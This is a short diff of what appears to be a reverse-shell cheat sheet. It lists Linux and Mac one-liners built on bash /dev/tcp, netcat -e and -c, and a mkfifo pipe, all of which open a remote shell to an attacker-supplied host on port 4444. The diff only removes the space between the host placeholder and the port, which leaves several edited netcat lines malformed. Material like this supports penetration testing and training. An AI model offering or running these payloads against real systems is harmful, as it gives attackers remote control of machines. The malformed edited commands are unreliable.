@@ -46,11 +46,11 @@ Linux Shells:
 
 [1] bash -i >& /dev/tcp/<LHOST>/4444 0>&1
 
-[2] nc -c bash <LHOST> 4444
+[2] nc -c bash <LHOST>4444
 
-[3] nc <LHOST> 4444 -e bash
+[3] nc <LHOST>4444 -e bash
 
-[4] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
+[4] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST>4444 >/tmp/f
 
 ---
 M
@@ -59,7 +59,7 @@ Mac Shells:
 
 [1] bash -i >& /dev/tcp/<LHOST>/4444 0>&1
 
-[2] nc -c bash <LHOST> 4444
+[2] nc -c bash <LHOST>4444
 
 [3] nc <LHOST> 4444 -e bash
 
